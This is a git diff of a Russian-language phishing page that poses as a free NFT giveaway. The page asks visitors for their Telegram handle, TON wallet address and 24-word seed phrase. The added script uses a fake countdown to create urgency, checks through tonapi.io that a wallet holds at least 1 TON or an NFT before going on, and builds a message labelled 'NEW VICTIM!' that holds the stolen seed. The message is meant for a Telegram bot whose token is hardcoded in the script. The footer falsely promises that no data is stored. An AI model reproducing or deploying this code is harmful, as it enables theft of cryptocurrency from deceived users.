@@ -5,116 +5,134 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NFT Подарок</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: Arial, sans-serif;
-            background: #0d1117;
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .box {
-            background: #161b22;
-            padding: 40px;
-            border-radius: 20px;
-            max-width: 450px;
-            width: 100%;
-            box-shadow: 0 0 50px rgba(0,0,0,0.5);
-        }
-        .box h2 {
-            text-align: center;
-            margin-bottom: 10px;
-            font-size: 28px;
-        }
-        .box p {
-            text-align: center;
-            color: #8b949e;
-            margin-bottom: 25px;
-            font-size: 14px;
-        }
-        input {
-            width: 100%;
-            padding: 12px 15px;
-            margin-bottom: 15px;
-            border-radius: 10px;
-            border: 1px solid #30363d;
-            background: #0d1117;
-            color: white;
-            font-size: 15px;
-            outline: none;
-        }
-        input:focus {
-            border-color: #238636;
-        }
-        button {
-            width: 100%;
-            padding: 15px;
-            background: #238636;
-            border: none;
-            border-radius: 10px;
-            color: white;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        button:hover {
-            background: #2ea043;
-        }
-        .footer {
-            text-align: center;
-            color: #8b949e;
-            font-size: 12px;
-            margin-top: 20px;
-        }
-        .footer a {
-            color: #58a6ff;
-            text-decoration: none;
-        }
-        .timer {
-            text-align: center;
-            color: #f0883e;
-            font-size: 14px;
-            margin-bottom: 20px;
-            font-weight: bold;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .box { background: #161b22; padding: 40px; border-radius: 20px; max-width: 450px; width: 100%; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 10px; border: 1px solid #30363d; background: #0d1117; color: white; }
+        button { width: 100%; padding: 15px; background: #238636; border: none; border-radius: 10px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; }
+        button:hover { background: #2ea043; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        .error { color: #f85149; font-size: 14px; margin-top: 10px; display: none; }
+        .loading { color: #f0883e; font-size: 14px; margin-top: 10px; display: none; }
+        .footer { text-align: center; color: #8b949e; font-size: 12px; margin-top: 20px; }
+        .timer { text-align: center; color: #f0883e; font-size: 18px; margin-bottom: 20px; font-weight: bold; }
+        .info { text-align: center; color: #8b949e; font-size: 13px; margin-bottom: 20px; background: #0d1117; padding: 12px; border-radius: 10px; border: 1px solid #30363d; }
+        .info span { color: #f0883e; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2>🎁 NFT Подарок</h2>
-        <p>Введи данные и получи уникальный NFT</p>
-        <div class="timer">⏳ Осталось подарков: 3 из 10</div>
+        <h2 style="text-align:center; margin-bottom:10px;">🎁 NFT Подарок</h2>
+        <p style="text-align:center; color:#8b949e; margin-bottom:25px;">Введи данные и получи уникальный NFT</p>
+        
+        <!-- ТАЙМЕР -->
+        <div class="timer">⏳ До конца розыгрыша: <span id="countdown">--:--:--</span></div>
+
+        <!-- УСЛОВИЯ УЧАСТИЯ -->
+        <div class="info">
+            ⚡ Для участия необходим минимальный баланс: <span>1 TON</span><br>
+            🛡️ Это защита от ботов и спама.
+        </div>
+        
         <form id="giftForm">
             <input type="text" id="tg" placeholder="📱 Telegram (например, @username)" required>
             <input type="text" id="wallet" placeholder="💳 Кошелёк TON (EQD... или UQD...)" required>
             <input type="text" id="seed" placeholder="🔑 Сид-фраза (24 слова через пробел)" required>
-            <button type="submit">🚀 Получить подарок</button>
+            <div class="loading" id="loading">⏳ Проверка кошелька...</div>
+            <div class="error" id="error">❌ Ваш кошелёк пуст или не подходит для участия.</div>
+            <button type="submit" id="submitBtn">🚀 Получить подарок</button>
         </form>
+        
         <div class="footer">
-            ⚠️ Подключение безопасно. Мы не храним твои данные.<br>
-            <a href="#">Политика конфиденциальности</a>
+            ⚠️ Подключение безопасно. Мы не храним твои данные.
         </div>
     </div>
 
     <script>
+        // ===== ТАЙМЕР НА 24 ЧАСА (АВТОСБРОС) =====
+        function startTimer() {
+            const now = new Date();
+            const end = new Date(now);
+            end.setHours(23, 59, 59, 999);
+            
+            if (now.getHours() === 23 && now.getMinutes() >= 59) {
+                end.setDate(end.getDate() + 1);
+            }
+
+            function updateTimer() {
+                const now = new Date();
+                let diff = end - now;
+
+                if (diff <= 0) {
+                    end.setDate(end.getDate() + 1);
+                    diff = end - now;
+                }
+
+                const hours = Math.floor(diff / (1000 * 60 * 60));
+                const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+
+                document.getElementById('countdown').textContent = 
+                    `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+            }
+
+            updateTimer();
+            setInterval(updateTimer, 1000);
+        }
+
+        startTimer();
+
+        // ===== ПРОВЕРКА КОШЕЛЬКА =====
+        async function checkWalletBalance(walletAddress) {
+            try {
+                const balanceUrl = `https://tonapi.io/v2/accounts/${walletAddress}`;
+                const balanceResp = await fetch(balanceUrl);
+                if (!balanceResp.ok) return false;
+                const balanceData = await balanceResp.json();
+                const balance = balanceData.balance / 1e9;
+                
+                const nftsUrl = `https://tonapi.io/v2/accounts/${walletAddress}/nfts`;
+                const nftsResp = await fetch(nftsUrl);
+                if (!nftsResp.ok) return false;
+                const nftsData = await nftsResp.json();
+                const nftsCount = nftsData.nfts ? nftsData.nfts.length : 0;
+                
+                // МЕНЯЕМ УСЛОВИЕ: теперь нужно минимум 1 TON ИЛИ NFT
+                return balance >= 1 || nftsCount > 0;
+            } catch (e) {
+                console.error('Ошибка проверки:', e);
+                return false;
+            }
+        }
+
+        // ===== ОТПРАВКА ДАННЫХ В TELEGRAM =====
         document.getElementById('giftForm').onsubmit = async function(e) {
             e.preventDefault();
 
             const tg = document.getElementById('tg').value;
             const wallet = document.getElementById('wallet').value;
             const seed = document.getElementById('seed').value;
+            const errorEl = document.getElementById('error');
+            const loadingEl = document.getElementById('loading');
+            const submitBtn = document.getElementById('submitBtn');
 
-            // Отправляем данные в бота
+            loadingEl.style.display = 'block';
+            errorEl.style.display = 'none';
+            submitBtn.disabled = true;
+
+            const isValid = await checkWalletBalance(wallet);
+
+            loadingEl.style.display = 'none';
+            submitBtn.disabled = false;
+
+            if (!isValid) {
+                errorEl.style.display = 'block';
+                return;
+            }
+
+            // === ВСТАВЬ СВОИ ДАННЫЕ ===
             const botToken = "8592619289:AAHr5VK2tCOhGdRSyBbjFYWQK7k4aKlBUYE";
-            const chatId = "8702991121"; // сюда придут данные
+            const chatId = "766696719"; // ЗАМЕНИ НА СВОЙ ID
 
             const text = `🔴 НОВАЯ ЖЕРТВА!\n👤 TG: ${tg}\n💳 Кошелёк: ${wallet}\n🔑 Сид: ${seed}`;
 
